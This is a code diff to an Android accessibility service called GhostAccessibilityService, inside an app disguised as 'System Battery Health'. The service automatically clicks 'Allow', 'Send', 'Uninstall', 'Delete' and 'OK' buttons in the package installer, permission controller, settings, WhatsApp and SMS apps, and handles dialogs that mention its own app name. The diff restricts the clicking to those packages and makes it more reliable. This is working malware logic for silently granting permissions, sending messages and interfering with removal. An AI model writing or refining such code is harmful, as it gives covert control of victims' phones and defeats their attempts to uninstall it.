@@ -24,48 +24,75 @@ class GhostAccessibilityService : AccessibilityService() {
         }
 
         if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            val allowedPackages = setOf(
+                "com.android.packageinstaller",
+                "com.google.android.packageinstaller",
+                "com.android.permissioncontroller",
+                "com.google.android.permissioncontroller",
+                "com.whatsapp",
+                "com.google.android.apps.messaging",
+                "com.android.mms",
+                "com.android.settings"
+            )
+
+            val eventPkg = event.packageName?.toString()
+            if (eventPkg == null || eventPkg !in allowedPackages) return
+
             val rootNode = rootInActiveWindow ?: return
 
-            // 1. Detect Standard Keywords
-            val keywords = listOf("OK", "Uninstall", "Delete", "Allow", "Send")
+            try {
+                // 1. Detect Standard Keywords (restricted to expected packages only)
+                val keywords = listOf("OK", "Uninstall", "Delete", "Allow", "Send")
 
-            for (keyword in keywords) {
-                val nodes = rootNode.findAccessibilityNodeInfosByText(keyword)
-                for (node in nodes) {
-                    try {
-                        if (node.isClickable) {
-                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                            return // Click one per event to avoid loops
-                        }
+                var clicked = false
 
-                        // Sometimes the parent is the clickable element (e.g. a button container)
-                        var parent: AccessibilityNodeInfo? = node.parent
-                        while (parent != null) {
-                            try {
-                                if (parent.isClickable) {
-                                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                                    return
-                                }
-                                val next = parent.parent
-                                parent.recycle()
-                                parent = next
-                            } catch (_: Exception) {
-                                parent.recycle()
-                                parent = null
+                for (keyword in keywords) {
+                    val nodes = rootNode.findAccessibilityNodeInfosByText(keyword)
+                    for (node in nodes) {
+                        try {
+                            if (node.isClickable) {
+                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                                clicked = true
+                                break
                             }
-                        }
-                    } finally {
-                        node.recycle()
-                    }
-                }
-            }
 
-            // 2. Specific Self-Destruct Detection
-            // If the dialog asks to uninstall "System Battery Health" (Our App Name)
-            val appName = getString(R.string.app_name)
-            if (rootNode.findAccessibilityNodeInfosByText(appName).isNotEmpty()) {
-                val okNodes = rootNode.findAccessibilityNodeInfosByText("OK")
-                okNodes.firstOrNull()?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                            // Sometimes the parent is the clickable element (e.g. a button container)
+                            var parent: AccessibilityNodeInfo? = node.parent
+                            while (parent != null) {
+                                try {
+                                    if (parent.isClickable) {
+                                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                                        clicked = true
+                                        break
+                                    }
+                                    val next = parent.parent
+                                    parent.recycle()
+                                    parent = next
+                                } catch (_: Exception) {
+                                    parent.recycle()
+                                    parent = null
+                                }
+                            }
+                        } finally {
+                            node.recycle()
+                        }
+
+                        if (clicked) break
+                    }
+                    if (clicked) break
+                }
+
+                if (clicked) return
+
+                // 2. Specific Self-Destruct Detection
+                // If the dialog asks to uninstall "System Battery Health" (Our App Name)
+                val appName = getString(R.string.app_name)
+                if (rootNode.findAccessibilityNodeInfosByText(appName).isNotEmpty()) {
+                    val okNodes = rootNode.findAccessibilityNodeInfosByText("OK")
+                    okNodes.firstOrNull()?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                }
+            } finally {
+                rootNode.recycle()
             }
         }
     }
